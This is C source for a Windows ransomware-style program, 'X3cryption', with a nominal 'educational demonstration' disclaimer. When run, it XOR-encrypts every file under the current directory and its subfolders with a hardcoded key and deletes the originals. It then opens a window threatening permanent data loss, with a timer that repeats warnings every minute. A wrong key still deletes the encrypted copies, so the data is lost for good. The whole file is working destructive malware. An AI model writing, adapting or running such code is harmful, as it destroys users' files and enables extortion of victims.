#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE 4096
#define KEY_SIZE 32
#define WINDOW_WIDTH 500
#define WINDOW_HEIGHT 400
#define TEXTBOX_WIDTH 350
#define TEXTBOX_HEIGHT 25
#define BUTTON_WIDTH 150
#define BUTTON_HEIGHT 35
#define TIMER_ID 1  // ID for the countdown timer

#define ID_TEXTBOX 1001
#define ID_DECRYPT_BUTTON 1002

HWND hTextbox;
char decryptionKey[256] = {0};    // User-input decryption key
char originalPath[MAX_PATH] = {0};  // Path for the files to encrypt/decrypt

// XOR-based encryption function to toggle encryption/decryption
void xor_encrypt(unsigned char* data, size_t data_len, const unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Generate a fixed-size key from the password provided
void generate_key(const char* password, unsigned char* key) {
    memset(key, 0, KEY_SIZE);
    strncpy((char*)key, password, KEY_SIZE);
}

// Encrypt or decrypt a file based on the 'encrypt' flag
void process_file(const char* input_file, const char* password, int encrypt) {
    unsigned char key[KEY_SIZE];
    generate_key(password, key);

    FILE* in_file = fopen(input_file, "rb");
    if (!in_file) return;

    // Determine output file name based on operation (encryption or decryption)
    char output_file[MAX_PATH];
    if (encrypt) {
        snprintf(output_file, sizeof(output_file), "%s.enc", input_file);
    } else {
        size_t len = strlen(input_file);
        if (len > 4 && strcmp(input_file + len - 4, ".enc") == 0) {
            strncpy(output_file, input_file, len - 4);
            output_file[len - 4] = '\0';
        } else {
            fclose(in_file);
            return;
        }
    }

    FILE* out_file = fopen(output_file, "wb");
    if (!out_file) {
        fclose(in_file);
        return;
    }

    unsigned char buffer[BUFFER_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, in_file)) > 0) {
        xor_encrypt(buffer, bytes_read, key, KEY_SIZE);
        fwrite(buffer, 1, bytes_read, out_file);
    }

    fclose(in_file);
    fclose(out_file);

    if (encrypt) {
        remove(input_file);  // Remove original file after encryption
    } else {
        remove(input_file);  // Remove encrypted file after decryption
    }
}

// Recursively encrypt/decrypt all files in a directory
void process_directory(const char* dir_path, const char* password, int encrypt) {
    WIN32_FIND_DATA find_file_data;
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", dir_path);
    
    HANDLE hFind = FindFirstFile(search_path, &find_file_data);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(find_file_data.cFileName, ".") == 0 || 
            strcmp(find_file_data.cFileName, "..") == 0) continue;

        char file_path[MAX_PATH];
        snprintf(file_path, sizeof(file_path), "%s\\%s", dir_path, find_file_data.cFileName);

        if (find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            process_directory(file_path, password, encrypt);
        } else {
            process_file(file_path, password, encrypt);
        }
    } while (FindNextFile(hFind, &find_file_data));

    FindClose(hFind);
}

// Window procedure for handling GUI interactions
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch(msg) {
        case WM_CREATE: {
            // Set background color for the window
            HBRUSH hBrush = CreateSolidBrush(RGB(30, 30, 30));
            SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND, (LONG_PTR)hBrush);

            // Create password input textbox for decryption key
            hTextbox = CreateWindowW(L"EDIT", L"",
                WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD,
                (WINDOW_WIDTH - TEXTBOX_WIDTH) / 2, 230,
                TEXTBOX_WIDTH, TEXTBOX_HEIGHT,
                hwnd, (HMENU)ID_TEXTBOX, NULL, NULL);

            // Create decrypt button
            CreateWindowW(L"BUTTON", L"Decrypt Files",
                WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                (WINDOW_WIDTH - BUTTON_WIDTH) / 2, 270,
                BUTTON_WIDTH, BUTTON_HEIGHT,
                hwnd, (HMENU)ID_DECRYPT_BUTTON, NULL, NULL);

            SetFocus(hTextbox);

            // Set a timer to remind the user every 60 seconds
            SetTimer(hwnd, TIMER_ID, 60000, NULL);  // 60-second reminder
            break;
        }

        case WM_TIMER:
            if (wParam == TIMER_ID) {
                MessageBoxW(hwnd, L"Time is running out. Enter the decryption key now or face permanent loss!", 
                            L"Warning", MB_ICONWARNING | MB_OK);
            }
            break;

        case WM_COMMAND: {
            if(LOWORD(wParam) == ID_DECRYPT_BUTTON) {
                GetWindowTextA(hTextbox, decryptionKey, 256);

                if(strlen(decryptionKey) < 1) {
                    MessageBoxW(hwnd, L"Please enter the decryption key!", 
                                L"Error", MB_ICONERROR | MB_OK);
                    break;
                }

                // Start decryption process
                process_directory(originalPath, decryptionKey, 0);
                MessageBoxW(hwnd, L"Decryption complete!", 
                            L"Success", MB_ICONINFORMATION | MB_OK);
                DestroyWindow(hwnd);
            }
            break;
        }

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            // Define fonts and colors for the title and information text
            HFONT hFontTitle = CreateFontA(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial Black");
            HFONT hFontInfo = CreateFontA(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
            
            SelectObject(hdc, hFontTitle);
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(255, 0, 0));  // Red for title emphasis

            // Title text
            RECT titleRect = {10, 20, WINDOW_WIDTH - 10, 80};
            const wchar_t *titleText = L"X3cryption";
            DrawTextW(hdc, titleText, -1, &titleRect, DT_CENTER | DT_SINGLELINE);

            // Developer info
            SelectObject(hdc, hFontInfo);
            SetTextColor(hdc, RGB(255, 255, 255));  // White for info text
            RECT developerRect = {10, 60, WINDOW_WIDTH - 10, 120};
            const wchar_t *developerText = L"Developed by: X3NIDE";
            DrawTextW(hdc, developerText, -1, &developerRect, DT_CENTER | DT_SINGLELINE);

            // Main Message
            RECT rect = {10, 120, WINDOW_WIDTH - 10, 210};
            const wchar_t *text = L"ATTENTION!\n"
                                  L"Your files have been encrypted with a powerful algorithm.\n"
                                  L"To recover your files, enter the correct decryption key below.\n"
                                  L"Failure to do so will result in permanent loss of your data.\n"
                                  L"Act quickly, as time is limited.";
            DrawTextW(hdc, text, -1, &rect, DT_CENTER);

            // Disclaimer
            RECT disclaimerRect = {10, 330, WINDOW_WIDTH - 10, 370};
            const wchar_t *disclaimerText = L"Disclaimer: This tool is for educational demonstration only.";
            DrawTextW(hdc, disclaimerText, -1, &disclaimerRect, DT_CENTER | DT_SINGLELINE);

            EndPaint(hwnd, &ps);
            break;
        }

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// Initialize and display the decryption GUI
void ShowDecryptionDialog(HINSTANCE hInstance) {
    const wchar_t CLASS_NAME[] = L"X3cryptionWindowClass";
    WNDCLASSW wc = {0};  // Use WNDCLASSW for wide-character compatibility

    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    
    RegisterClassW(&wc);

    // Position the window at the center of the screen
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowX = (screenWidth - WINDOW_WIDTH) / 2;
    int windowY = (screenHeight - WINDOW_HEIGHT) / 2;

    HWND hwnd = CreateWindowExW(
        0, CLASS_NAME, L"X3cryption - File Decryption",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
        windowX, windowY, WINDOW_WIDTH, WINDOW_HEIGHT,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    MSG msg = {0};
    while(GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// Main entry point, initiates encryption and displays GUI
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                  LPSTR lpCmdLine, int nCmdShow) {
    // Store the initial directory path
    GetCurrentDirectory(MAX_PATH, originalPath);

    // Define a hardcoded encryption key
    const char* encryptionKey = "x3cryption_key";

    // Encrypt files in the initial directory upon startup
    process_directory(originalPath, encryptionKey, 1);

    // Show the decryption interface
    ShowDecryptionDialog(hInstance);

    return 0;
}
